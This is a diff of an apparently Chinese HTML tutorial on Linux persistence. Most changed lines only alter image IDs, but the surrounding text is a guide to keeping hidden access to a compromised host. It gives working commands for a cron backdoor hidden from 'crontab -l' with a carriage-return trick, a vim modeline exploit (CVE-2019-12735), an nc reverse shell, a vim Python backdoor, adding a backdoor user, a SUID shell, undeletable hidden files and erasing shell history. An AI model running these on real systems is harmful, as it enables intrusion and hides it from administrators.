-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657495783067713.jpg" data-lightbox="2b98235c-56af-4043-8bda-b9f6f68f3410" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657495783067713.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657493082746662.jpg" data-lightbox="e4708fd3-e523-40d1-a252-10a4a8596373" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657493082746662.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657495783067713.jpg" data-lightbox="3a96d942-0b71-4622-9e12-718a67297e2e" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657495783067713.jpg" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E5F;&#x80FD;&#x6293;&#x5230;&#x5199;&#x5165;&#x5BC6;&#x7801;&#x3002;</p>
 <p><strong>Info&#xFF1A;</strong></p>
 <blockquote>
@@ -4633,14 +4659,14 @@ print repr<span class="token punctuation">(</span>buffer<span class="token punct
 <p><strong>Cron&#x540E;&#x95E8;</strong></p>
 <p><a href="http://qqe2.com/cron" target="_blank">http://qqe2.com/cron</a> cron&#x8868;&#x8FBE;&#x5F0F;&#x5728;&#x7EBF;&#x751F;&#x6210;&#xFF1A;</p>
 <pre class="language-"><code>(crontab -l;echo &apos;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i&apos;)|crontab -
-</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182035993317816.jpg" data-lightbox="65e648f0-ed8d-4927-931b-6d89a6dcd975" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182035993317816.jpg" alt=""></a></p>
+</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182035993317816.jpg" data-lightbox="2a3aaa18-88be-4a6e-9177-59656d9d04fa" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182035993317816.jpg" alt=""></a></p>
 <p>&#x8FD9;&#x6837;&#x6267;&#x884C;&#x4F1A;&#x5728;crontab&#x5217;&#x8868;&#x91CC;&#x51FA;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5982;&#x4E0A;&#x6267;&#x884C;&#x7684;&#x8BDD;&#xFF0C;&#x7BA1;&#x7406;&#x5458;&#x6267;&#x884C;crontab -l&#x5C31;&#x80FD;&#x770B;&#x5230;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x5185;&#x5BB9;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x9690;&#x853D;&#x3002;</p>
 <p>&#x90A3;&#x4E48;&#x5C31;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x7684;&#x9AD8;&#x7EA7;&#x7528;&#x6CD5;&#xFF0C;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x4F1A;&#x663E;&#x793A;&#x201D;no crontab for root&#x201D;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x8FBE;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x9690;&#x85CF;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x7BA1;&#x7406;&#x5458;&#x5982;&#x679C;&#x6267;&#x884C;crontab -l&#x5C31;&#x4F1A;&#x770B;&#x5230;&#x663E;&#x793A;&#x201D;no crontab for root&#x201D;&#x3002;</p>
 <pre class="language-"><code>(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
-</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182046862655180.jpg" data-lightbox="19989709-4bc3-4698-a0f0-8a10811228b5" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182046862655180.jpg" alt=""></a></p>
+</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182046862655180.jpg" data-lightbox="b60ebcb5-6db7-4396-93bd-04f728a3d0db" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182046862655180.jpg" alt=""></a></p>
 <p>&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x4ED6;&#x5C06;cron&#x6587;&#x4EF6;&#x5199;&#x5230;&#x6587;&#x4EF6;&#x4E2D;&#x3002;/var/spool/cron/crontabs/root &#x3002;&#x800C;crontab -l&#x5C31;&#x662F;&#x5217;&#x51FA;&#x4E86;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
 <p>&#x901A;&#x5E38;cat&#x662F;&#x770B;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A;&#x7684;&#xFF0C;&#x53EA;&#x80FD;&#x5229;&#x7528;less&#x6216;&#x8005;vim&#x770B;&#x5230;&#xFF0C;<strong>&#x8FD9;&#x4E5F;&#x662F;&#x5229;&#x7528;&#x4E86;cat&#x7684;&#x4E00;&#x4E2A;&#x7F3A;&#x9677;</strong>&#xFF0C;&#x540E;&#x9762;&#x4F1A;&#x8BB2;&#x5230;&#x3002;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182058225137627.jpg" data-lightbox="f703d83f-3df7-4134-9cdc-4fd74e23dc87" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182058225137627.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182058225137627.jpg" data-lightbox="9cfcb87b-bfe1-4f56-b238-acc72948daee" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182058225137627.jpg" alt=""></a></p>
 <p><code>/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/  /etc/cron.hourly/  /etc/cron.monthly/</code> &#x8FD9;&#x51E0;&#x4E2A;&#x8DEF;&#x5F84;&#x90FD;&#x53EF;&#x4EE5;&#x5B58;&#x653E;cron&#x6267;&#x884C;&#x811A;&#x672C;,&#x5BF9;&#x5E94;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x540C;&#x3002;</p>
 <h3 id="hiding-from-cats"><a name="hiding-from-cats" class="anchor-navigation-ex-anchor" href="#hiding-from-cats"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.1. hiding-from-cats</h3>
 <p><strong>cat&#x9690;&#x85CF;&#x8BF4;&#x660E;</strong></p>
@@ -4656,9 +4682,9 @@ output <span class="token operator">=</span> <span class="token string">&quot;#!
 output <span class="token operator">+=</span> cmd_h <span class="token operator">+</span> <span class="token string">&quot;;&quot;</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">&quot; #\r&quot;</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">&quot; &quot;</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span>
 f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418207207113264.jpg" data-lightbox="07587a66-8438-4b4a-8bb3-f9705027cf0d" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418207207113264.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418207207113264.jpg" data-lightbox="92f223f6-4951-4772-944b-e10613ce5e40" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418207207113264.jpg" alt=""></a></p>
 <p>&#x4F7F;&#x7528;coderunner&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;test.sh&#x811A;&#x672C;&#x3002;cat&#x770B;&#x4E86;&#x4E0B;&#x811A;&#x672C;&#x7684;&#x5185;&#x5BB9;&#x662F;echo&#x4E00;&#x4E2A;hello world! &#x4E14;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x53EA;&#x6709;&#x4ED6;&#x672C;&#x6587;&#x4EF6;&#x3002;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x7528;sh test.sh&#x6267;&#x884C;&#x540E;&#x3002;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182087380654545.jpg" data-lightbox="0ad997e9-375c-48c4-912c-8d250a32a7a0" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182087380654545.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182087380654545.jpg" data-lightbox="502682c4-7e2b-4949-94bb-e901e7439815" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182087380654545.jpg" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6267;&#x884C;&#x811A;&#x672C;&#x540E;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;oops&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x5C31;&#x662F; You forgot to check cat -A! &#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6765;&#x8FD9;&#x6837;&#x5C31;&#x505A;&#x5230;&#x4E86;&#x6076;&#x610F;&#x547D;&#x4EE4;&#x9690;&#x85CF;&#x7684;&#x6548;&#x679C;&#x3002;&#x5176;&#x5B9E;&#x4E4B;&#x524D;Cron&#x540E;&#x95E8;&#x4E2D;&#x7684;&#x9690;&#x85CF;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x5229;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x3002;&#x5982;&#x679C;&#x4F7F;&#x7528;cat &#x2014;A &#x67E5;&#x770B;root&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x771F;&#x6B63;&#x5185;&#x5BB9;&#x4E86;&#x3002;</p>
 <h2 id="vim&#x540E;&#x95E8;"><a name="vim&#x540E;&#x95E8;" class="anchor-navigation-ex-anchor" href="#vim&#x540E;&#x95E8;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. vim&#x540E;&#x95E8;</h2>
 <p><strong>vim modeline CVE-2019-12735</strong></p>
@@ -4669,11 +4695,11 @@ f<span class="token punctuation">.</span>write<span class="token punctuation">(<
 </code></pre>
 <pre class="language-"><code>poc:
 :!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;
-</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418211344302977.jpg" data-lightbox="c6f3e7ee-5924-4c15-9812-95d3c831f3c6" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418211344302977.jpg" alt=""></a></p>
+</code></pre><p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418211344302977.jpg" data-lightbox="62e8d930-b0bd-4c5e-9726-357b7a041fde" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418211344302977.jpg" alt=""></a></p>
 <p>&#x53CD;&#x5F39;shell&#xFF1A;</p>
 <pre class="language-"><code class="lang-bash">:<span class="token operator">!</span>rm /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">9999</span> <span class="token operator">&gt;</span>/tmp/f<span class="token operator">||</span><span class="token string">&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;</span>source<span class="token punctuation">\</span><span class="token operator">!</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>%<span class="token string">&quot;):fdl=0:fdt=&quot;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182129772116504.jpg" data-lightbox="75dc5d44-c2f9-486e-ba79-377bcef5e8e4" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182129772116504.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182129772116504.jpg" data-lightbox="14552e0a-8a2b-4728-88e4-2433ed852253" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182129772116504.jpg" alt=""></a></p>
 <h3 id="vim-python&#x6269;&#x5C55;&#x540E;&#x95E8;"><a name="vim-python&#x6269;&#x5C55;&#x540E;&#x95E8;" class="anchor-navigation-ex-anchor" href="#vim-python&#x6269;&#x5C55;&#x540E;&#x95E8;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.1. vim python&#x6269;&#x5C55;&#x540E;&#x95E8;</h3>
 <p>&#x9002;&#x7528;&#x4E8E;&#x5B89;&#x88C5;&#x4E86;vim&#x4E14;&#x5B89;&#x88C5;&#x4E86;python&#x6269;&#x5C55;(&#x7EDD;&#x5927;&#x7248;&#x672C;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;)&#x7684;linux&#x7CFB;&#x7EDF;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;vim&#x7684;pyfile&#x6765;&#x6267;&#x884C;python&#x811A;&#x672C;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x590D;&#x73B0;&#x4F7F;&#x7528;&#x4E86;docker centos 6.8&#xFF0C;yum&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;vim&#x3002;&#x4E0B;&#x9762;&#x7684;pdf&#x662F;&#x53D1;&#x73B0;&#x8005;&#x5BF9;&#x5916;&#x516C;&#x5F00;&#x7684;&#x601D;&#x8DEF;&#xFF1A;</p>
 <blockquote>
@@ -4697,8 +4723,8 @@ f<span class="token punctuation">.</span>write<span class="token punctuation">(<
 <pre class="language-"><code class="lang-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">nohup</span> <span class="token function">vim</span> -E -c <span class="token string">&quot;pyfile dir.py&quot;</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token variable">)</span></span> <span class="token operator">&amp;&amp;</span> <span class="token function">sleep</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f dir.py
 </code></pre>
 <p>&#x6267;&#x884C;&#x4EE5;&#x540E;&#xFF1A;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418214349676044.jpg" data-lightbox="d68e3f8a-5739-48bc-98c6-8480670b52d9" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418214349676044.jpg" alt=""></a></p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418215567496928.jpg" data-lightbox="8683a3d7-965e-4198-8901-bc8e37a6120b" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418215567496928.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418214349676044.jpg" data-lightbox="a690e7b0-d5a9-4f32-8df0-b452e5a76846" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418214349676044.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418215567496928.jpg" data-lightbox="b61bf86b-b050-475c-ada6-18ec8b055c96" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418215567496928.jpg" alt=""></a></p>
 <p>&#x6211;&#x5728;&#x653B;&#x51FB;&#x673A;nc&#x8FDE;&#x63A5;&#x8FC7;&#x53BB;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</p>
 <h2 id="&#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;"><a name="&#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;" class="anchor-navigation-ex-anchor" href="#&#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6. &#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;</h2>
 <pre class="language-"><code class="lang-bash"><span class="token function">useradd</span> guest<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">&apos;guest:123456&apos;</span><span class="token operator">|</span>chpasswd
@@ -4746,33 +4772,33 @@ gcc suid.c -o suidshell
 <pre class="language-"><code class="lang-bash"><span class="token function">touch</span> .backdoor
 <span class="token function">mkdir</span> .backdoor-file
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418220275679836.jpg" data-lightbox="fcef269f-bd64-42e7-bd93-c886ab34fa24" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418220275679836.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418220275679836.jpg" data-lightbox="7c02ac75-1eed-485c-9102-c939e2dec360" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418220275679836.jpg" alt=""></a></p>
 <p>&#x7ECF;&#x5E38;&#x4F7F;&#x7528;linux&#x4E2D;&#x4F1A;&#x77E5;&#x9053;&#x6BCF;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x5176;&#x5B9E;&#x90FD;&#x6709;.&#x548C;..&#x3001;&#x5206;&#x522B;&#x4EE3;&#x6307;&#x7684;&#x662F;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x548C;&#x4E0A;&#x7EA7;&#x76EE;&#x5F55;&#x3002; &#x5EFA;&#x7ACB;...&#x6587;&#x4EF6;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x9690;&#x85CF;&#x65B9;&#x6CD5;&#x3002;</p>
 <p><strong>&#x5EFA;&#x7ACB;..&#x6587;&#x4EF6;/&#x6587;&#x4EF6;&#x5939;</strong></p>
 <pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token string">&apos;whoami&apos;</span>  <span class="token operator">&gt;</span> <span class="token punctuation">..</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token comment"># &#x6CE8;&#x610F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8F6C;&#x4E49;&#x7B26;&#x540E;&#x6709;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182249885239715.jpg" data-lightbox="5b423dff-1be1-4612-ab17-b02543b0b7f8" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182249885239715.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182249885239715.jpg" data-lightbox="942511b1-1699-4309-a11b-434fa7510c3d" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182249885239715.jpg" alt=""></a></p>
 <pre class="language-"><code class="lang-bash"><span class="token function">bash</span> <span class="token punctuation">..</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token comment"># &#x8FD9;&#x91CC;&#x4E5F;&#x662F;&#x591A;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x3002;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182305382544189.jpg" data-lightbox="9890c635-7498-4cd0-a706-514f10b045ee" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182305382544189.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182305382544189.jpg" data-lightbox="5b6c61dc-94f8-4d50-be7b-b55efa96a540" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182305382544189.jpg" alt=""></a></p>
 <p>&#x8FD9;&#x6837;&#x5EFA;&#x7ACB;&#x7684;&#x6587;&#x4EF6;/&#x6587;&#x4EF6;&#x5939;&#x7BA1;&#x7406;&#x5458;&#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x51E0;&#x4E2A;&#x8F6C;&#x4E49;&#x7B26;&#x5EFA;&#x7ACB;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;rm+tab&#x662F;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x7684;&#x3002;&#x800C;&#x4E14;&#x6211;&#x6D4B;&#x8BD5;&#x4F7F;&#x7528;rm -rf ./*&#x4E5F;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x3002;</p>
 <h2 id="&#x53C2;&#x6570;&#x6DF7;&#x6DC6;&#x62E6;&#x622A;rm"><a name="&#x53C2;&#x6570;&#x6DF7;&#x6DC6;&#x62E6;&#x622A;rm" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x6570;&#x6DF7;&#x6DC6;&#x62E6;&#x622A;rm"><i class="fa fa-link" aria-hidden="true"></i></a>1.9. &#x53C2;&#x6570;&#x6DF7;&#x6DC6;&#x62E6;&#x622A;rm</h2>
 <p>&#x4F7F;&#x7528;echo&#x7B49;&#x5DE5;&#x5177;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x662F;<code>-rm</code>&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x6837;&#x5220;&#x9664;&#x7684;&#x65F6;&#x5019;bash&#x4F1A;&#x8BA4;&#x4E3A;-rm&#x662F;rm&#x7684;&#x53C2;&#x6570;&#x3002;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418232003722972.jpg" data-lightbox="08e088bc-7ed9-48c7-af48-0180b8f2e02e" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418232003722972.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418232003722972.jpg" data-lightbox="56650178-f5d3-4765-83c5-0ed0207d93b8" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418232003722972.jpg" alt=""></a></p>
 <p>&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x963B;&#x6B62;&#x7BA1;&#x7406;&#x5458;&#x53BB;&#x5220;&#x9664;&#xFF0C; &#x4E00;&#x822C;&#x53EA;&#x6709;<code>rm -- &apos;-rm&apos;</code>&#x624D;&#x4F1A;&#x5220;&#x9664;&#x6389;&#x3002;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182347339036035.jpg" data-lightbox="9ccbb7bd-b01a-4692-9a64-41e27c001abf" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182347339036035.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182347339036035.jpg" data-lightbox="a9b258bd-0ad5-46f8-beb2-e51a79fb8659" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182347339036035.jpg" alt=""></a></p>
 <p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x7BA1;&#x7406;&#x5458;&#x4F7F;&#x7528;&#x6B63;&#x5E38;&#x5220;&#x9664;&#x65B9;&#x5F0F;&#x4F1A;&#x62A5;&#x9519;&#x3002;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182358943537296.jpg" data-lightbox="0b51cac8-b421-4697-8a39-8f0a51a15d23" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182358943537296.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182358943537296.jpg" data-lightbox="4ae3c6df-d914-46bb-8a2b-27e96912a3c3" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182358943537296.jpg" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x7528;&#x4EE5;&#x4E0B;&#x65B9;&#x6CD5;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token number">123123123</span> <span class="token operator">&gt;</span> --
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418236859952616.jpg" data-lightbox="a34a29f5-f8ae-4fbd-9a3e-5ffff7be8c96" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418236859952616.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418236859952616.jpg" data-lightbox="54cd4c18-ed4a-45c5-9e4e-a24ac1899dda" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418236859952616.jpg" alt=""></a></p>
 <p>&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4E86;&#xFF0C;&#x6587;&#x4EF6;&#x6CA1;&#x5220;&#x9664;&#xFF0C;&#x547D;&#x4EE4;&#x4E5F;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#x3002;&#x7C7B;&#x4F3C;&#x7684;&#x53EF;&#x4EE5;&#x5229;&#x7528;bash&#x7684;\r&#x7F3A;&#x9677;&#xFF0C;&#x548C;&#x7BA1;&#x9053;&#x7B26;&#x3001;&#x91CD;&#x5B9A;&#x5411;&#x7B26;&#x4E4B;&#x7C7B;&#x7684;&#x3002;</p>
 <p><strong>&#x521B;&#x5EFA;&#x4E0D;&#x80FD;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;(&#x6743;&#x9650;&#x9690;&#x85CF;)</strong></p>
 <p>&#x8FD9;&#x4E2A;&#x7528;&#x6CD5;&#x5728;ctf&#x3001;awd&#x4E2D;&#x5E94;&#x7528;&#x5F88;&#x591A;&#xFF0C;&#x4F7F;&#x7528;chattr&#x6765;&#x7ED9;&#x4E0E;&#x9690;&#x85CF;&#x6743;&#x9650;&#x3002; &#x8FD9;&#x4E9B;&#x6743;&#x9650;&#x9700;&#x8981;&#x4F7F;&#x7528;lsattr&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x624D;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5230;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x8981;&#x4FEE;&#x6539;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x5219;&#x4F7F;&#x7528;chattr&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x6765;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x3002;</p>
 <pre class="language-"><code class="lang-bash">chattr +i hack.sh
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182381421572564.jpg" data-lightbox="1af2cf0d-75d6-4a88-b611-08f5bc32c7e8" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182381421572564.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182381421572564.jpg" data-lightbox="e515f92e-eb67-4b4f-839b-e97d27a27af0" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182381421572564.jpg" alt=""></a></p>
 <p>&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x3002;</p>
 <h2 id="&#x5220;&#x9664;&#x9690;&#x85CF;&#x5386;&#x53F2;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;"><a name="&#x5220;&#x9664;&#x9690;&#x85CF;&#x5386;&#x53F2;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;" class="anchor-navigation-ex-anchor" href="#&#x5220;&#x9664;&#x9690;&#x85CF;&#x5386;&#x53F2;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>1.10. &#x5220;&#x9664;/&#x9690;&#x85CF;&#x5386;&#x53F2;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;</h2>
 <p><strong>&#x5220;&#x9664;</strong></p>
@@ -4786,13 +4812,13 @@ gcc suid.c -o suidshell
